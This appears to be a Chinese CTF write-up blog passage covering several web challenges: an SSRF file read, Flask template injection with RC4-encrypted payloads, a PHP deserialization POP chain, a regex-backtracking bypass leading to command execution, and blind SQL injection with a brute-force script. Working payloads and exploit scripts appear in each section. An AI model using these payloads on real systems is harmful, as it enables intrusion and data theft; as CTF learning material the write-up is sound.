href="#easyssrf" class="headerlink" title="easyssrf"></a>easyssrf</h1><p>啊哈哈哈哈ssrf来咯</p><p><img src="/images/BUU/20220404154838.png"></p><p>本地文件读取</p><p><img src="/images/BUU/20220404155002.png"></p><p>梅开二度</p><p><img src="/images/BUU/20220404155040.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ha1x1ux1u.php</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br></pre></td></tr></table></figure><p>战斗结束</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">file</span>=/flag</span><br></pre></td></tr></table></figure><h1 id="is-secret"><a href="#is-secret" class="headerlink" title="is secret"></a>is secret</h1><p>参考<a href="https://blog.csdn.net/nicesa/article/details/107428983">[CISCN2019 华东南赛区]Double Secret</a></p><p>拿到环境扫出来robots.txt，只能说并没有得到有效信息</p><p><img src="/images/BUU/20220406214854.png"></p><p>看别人wp才知道要去访问secret目录，字典字段+1</p><p><img src="/images/BUU/20220406215115.png"></p><p>根据提示传参</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">secret</span>=233</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220406215320.png"></p><p>暂时看不出有什么规律，输入更长一点的参数时页面报错了</p><p><img src="/images/BUU/20220406215709.png"></p><p>得知这是flask后端 有个高亮代码段 点开看看</p><p><img src="/images/BUU/20220406220006.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line"></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><blockquote><p>这里其实就是对我们输入参数的一个判断，首先判断你是不是为空，如果是空的参数，则返回一段话，就是我们刚进页面看到的内容，如果你传入了参数，那么它就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是“HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。</p></blockquote><p>网上大佬的RC4加密脚本 太强了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  </span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出得到payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="variable">%14</span><span class="variable">%1</span>E<span class="variable">%12</span><span class="variable">%C3</span><span class="variable">%A484mg</span><span class="variable">%C2</span><span class="variable">%9</span>C<span class="variable">%C3</span><span class="variable">%8</span>B<span class="variable">%00</span><span class="variable">%C2</span><span class="variable">%81</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%97</span><span class="variable">%0</span>B<span class="variable">%C2</span><span class="variable">%9</span>EF<span class="variable">%3</span>B<span class="variable">%C2</span><span class="variable">%88</span>m<span class="variable">%C2</span><span class="variable">%AEM5</span><span class="variable">%C2</span><span class="variable">%96</span><span class="variable">%3</span>D<span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%5</span>B<span class="variable">%C3</span><span class="variable">%987</span><span class="variable">%C3</span><span class="variable">%AA</span><span class="variable">%12</span><span class="variable">%C2</span><span class="variable">%B4</span><span class="variable">%05</span><span class="variable">%C2</span><span class="variable">%84</span>A<span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%17</span><span class="variable">%C3</span><span class="variable">%9</span>Bh<span class="variable">%C3</span><span class="variable">%8</span>F<span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%C3</span><span class="variable">%A1a</span><span class="variable">%0</span>F<span class="variable">%C2</span><span class="variable">%AE</span><span class="variable">%09</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%C2</span><span class="variable">%AEyS</span><span class="variable">%2</span>A<span class="variable">%C2</span><span class="variable">%A2d</span><span class="variable">%7</span>C<span class="variable">%C2</span><span class="variable">%98</span>/<span class="variable">%00</span><span class="variable">%C2</span><span class="variable">%90</span><span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%03</span>Y<span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%9</span>B<span class="variable">%1</span>F<span class="variable">%C2</span><span class="variable">%B6H</span><span class="variable">%3</span>D<span class="variable">%0</span>A<span class="variable">%23</span><span class="variable">%C3</span><span class="variable">%B1</span><span class="variable">%5</span>B<span class="variable">%C2</span><span class="variable">%9</span>Cp<span class="variable">%C2</span><span class="variable">%AEn</span><span class="variable">%C2</span><span class="variable">%96</span>i<span class="variable">%5</span>Dv<span class="variable">%7</span>FX<span class="variable">%C2</span><span class="variable">%92</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220406220737.png"></p><p>要学的知识还有好多啊啊啊啊啊（瘫</p><h1 id="popchains"><a href="#popchains" class="headerlink" title="popchains"></a>popchains</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><p>梭！都可以梭！</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeup</span><br><span class="line">Road_is_Long::__toString</span><br><span class="line">Make_a_Change::__get</span><br><span class="line">Try_Work_Hard::__invoke</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r1</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$r2</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r1</span>-&gt;page = <span class="variable">$r2</span>;</span><br><span class="line"><span class="variable">$r2</span>-&gt;<span class="keyword">string</span> = <span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;effort = <span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$r1</span>));</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220404154310.png"></p><p>得到的base64拿去解码一下得到flag</p><h1 id="middlerce"><a href="#middlerce" class="headerlink" title="middlerce"></a>middlerce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_fichang shi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>json_decode()</code>解析参数还不让带<code>&#123;</code>，你是故意找茬是不是（</p><p>再加上<code>^</code> <code>～</code>等特殊字符都被过滤，只好试试<a href="https://www.freebuf.com/articles/web/190794.html">正则回溯上限绕过</a>，用python帮忙构造下数据包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;: &quot;`cat /f*&gt;result.txt`;&quot;, &quot;yee&quot;: &quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://1.14.71.254:28124/&quot;</span>, data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>然后访问result.txt</p><p><img src="/images/BUU/20220404193308.png"></p><h1 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h1><p>题目描述如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="variable">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>关键代码都放出来了，这道题的waf看来不会是一般的强的说，硬冲叭</p><p>首页提示成功登陆即可获得flag，随便登陆试试</p><p><img src="/images/BUU/20220406193804.png"></p><p>唯一帐号为<code>bilala</code>，再次尝试登陆</p><p><img src="/images/BUU/20220406194035.png"></p><p>上fuzz测试，根据过滤规则开始构造请求</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=<span class="number">2&#x27;</span>order<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">1</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><code>by</code>到<code>2</code>时报错，确定出列数只有一列。</p><p>但是联合注入又不给回显，tnnd</p><p>此路不通，回想我们现在已知的信息，能用的也只有题目描述的列名passwd和表名users了</p><p>再看看fuzz，<code>like</code>能用，除了作<code>=</code>的替身之外，它还能帮助我们作<a href="http://c.biancheng.net/view/7395.html">模糊查询</a>的说</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=<span class="number">1&#x27;</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>passwd<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">&#x27;b%&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220406201241.png"></p><p>成功利用，快速搓个脚本来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28788/login.php&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;bilala&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#&quot;</span>.<span class="built_in">format</span>(flag + i)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong password&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220406210057.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure><p>登陆进去，出现在面前的不是心心念念的flag，而是后端源码，他真的，我哭死</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//多加了亿点点过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span 